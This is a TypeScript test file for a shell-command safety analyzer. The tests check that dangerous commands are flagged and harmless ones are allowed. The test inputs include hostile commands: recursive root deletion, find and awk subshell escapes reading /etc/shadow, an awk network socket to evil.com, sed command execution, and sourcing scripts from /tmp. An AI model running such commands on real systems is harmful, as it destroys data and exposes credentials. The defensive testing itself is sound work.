import { ASTAnalyzer } from '../../src/security/ast-analyzer';

describe('Advanced AST Semantic Analyzers (Items 8-15)', () => {
  let analyzer: ASTAnalyzer;

  beforeEach(() => {
    analyzer = new ASTAnalyzer();
  });

  describe('Item 10: Dynamic Command Resolution & Expansion Detection', () => {
    it('blocks dynamic command names starting with variable expansions', () => {
      expect(analyzer.analyzeCommand('$CMD /etc/passwd').isSafe).toBe(false);
      expect(analyzer.analyzeCommand('${EXEC_TOOL} -rf /').isSafe).toBe(false);
      expect(analyzer.analyzeCommand('`which rm` -rf /').isSafe).toBe(false);
      expect(analyzer.analyzeCommand('$(echo rm) -rf /').isSafe).toBe(false);
    });

    it('blocks command substitution and dynamic subshell execution', () => {
      const result = analyzer.analyzeCommand('eval "$MALICIOUS_PAYLOAD"');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Dynamic evaluation primitive');
    });
  });

  describe('Item 11: Dedicated FindAnalyzer', () => {
    it('blocks find with -exec executing destructive utilities', () => {
      const res1 = analyzer.analyzeCommand('find /var/log -name "*.log" -exec rm -rf {} \\;');
      expect(res1.isSafe).toBe(false);
      expect(res1.reason).toContain('find');

      const res2 = analyzer.analyzeCommand('find . -type f -execdir /bin/sh -c "cat /etc/shadow" \\;');
      expect(res2.isSafe).toBe(false);

      const res3 = analyzer.analyzeCommand('find . -name "*.tmp" -ok shred -u {} \\;');
      expect(res3.isSafe).toBe(false);
    });

    it('blocks find with -delete flag', () => {
      const res = analyzer.analyzeCommand('find / -name "*.bak" -delete');
      expect(res.isSafe).toBe(false);
      expect(res.reason).toContain('-delete');
    });

    it('allows benign find queries without exec/delete', () => {
      expect(analyzer.analyzeCommand('find ./src -name "*.ts" -type f').isSafe).toBe(true);
      expect(analyzer.analyzeCommand('find . -maxdepth 2 -name "package.json"').isSafe).toBe(true);
    });
  });

  describe('Item 12: Dedicated Awk & Sed Semantic Escape Analyzers', () => {
    it('blocks awk system() subshell escapes', () => {
      const res1 = analyzer.analyzeCommand("awk 'BEGIN { system(\"rm -rf /\") }'");
      expect(res1.isSafe).toBe(false);
      expect(res1.reason).toContain('system()');

      const res2 = analyzer.analyzeCommand("awk 'BEGIN { system(\"/bin/bash\") }'");
      expect(res2.isSafe).toBe(false);
    });

    it('blocks awk getline command pipe execution', () => {
      const res = analyzer.analyzeCommand('awk \'BEGIN { "id" | getline res; print res }\'');
      expect(res.isSafe).toBe(false);
      expect(res.reason).toContain('getline');
    });

    it('blocks awk /inet/ network socket connections', () => {
      const res = analyzer.analyzeCommand('awk \'BEGIN { s = "/inet/tcp/0/evil.com/80"; print "GET /" |& s }\'');
      expect(res.isSafe).toBe(false);
      expect(res.reason).toContain('network');
    });

    it('blocks sed e flag command execution', () => {
      const res = analyzer.analyzeCommand("sed 's/.*/echo pwned/e' data.txt");
      expect(res.isSafe).toBe(false);
      expect(res.reason).toContain('sed');
    });

    it('allows benign awk and sed transformations', () => {
      expect(analyzer.analyzeCommand("awk '{print $1, $2}' input.txt").isSafe).toBe(true);
      expect(analyzer.analyzeCommand("sed 's/foo/bar/g' file.txt").isSafe).toBe(true);
    });
  });

  describe('Item 14: Dedicated Source / Path Analyzer', () => {
    it('blocks sourcing scripts from temporary or untrusted directories', () => {
      expect(analyzer.analyzeCommand('source /tmp/evil.sh').isSafe).toBe(false);
      expect(analyzer.analyzeCommand('. /var/tmp/payload.sh').isSafe).toBe(false);
      expect(analyzer.analyzeCommand('source /dev/shm/script').isSafe).toBe(false);
    });

    it('blocks sourcing dynamic variables', () => {
      expect(analyzer.analyzeCommand('source $SCRIPT_PATH').isSafe).toBe(false);
    });
  });

  describe('Item 15: Dedicated Mv System Destruction Analyzer', () => {
    it('blocks moving sensitive system files or moving to /dev/null', () => {
      expect(analyzer.analyzeCommand('mv /etc/passwd /dev/null').isSafe).toBe(false);
      expect(analyzer.analyzeCommand('mv /var/log /tmp/backup').isSafe).toBe(false);
      expect(analyzer.analyzeCommand('mv /usr/bin/node /usr/bin/node.bak').isSafe).toBe(false);
    });

    it('allows benign workspace file movements', () => {
      expect(analyzer.analyzeCommand('mv src/old-name.ts src/new-name.ts').isSafe).toBe(true);
      expect(analyzer.analyzeCommand('mv ./dist/bundle.js ./public/bundle.js').isSafe).toBe(true);
    });
  });
});
